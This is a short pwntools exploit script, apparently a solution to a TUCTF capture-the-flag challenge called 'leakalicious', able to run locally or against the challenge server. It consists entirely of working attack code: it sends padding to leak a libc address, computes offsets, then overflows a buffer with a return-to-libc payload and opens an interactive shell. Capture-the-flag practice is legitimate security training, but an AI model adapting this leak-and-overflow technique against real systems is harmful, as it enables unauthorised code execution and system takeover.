from pwn import *

e = ELF("./leakalicious")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30505)
else:
  p = process(e.path)

p.sendlineafter(">", "A" * 31)
p.recvline()

leak = u32(p.recv(4)) - 0x06d210
print("{:#x}".format(leak))

p.sendlineafter(">", "A" * 0x2c + p32(leak +  0x042c00) + p32(0) + p32(leak +   0x184b35))
p.sendlineafter(">", "A")

p.interactive()
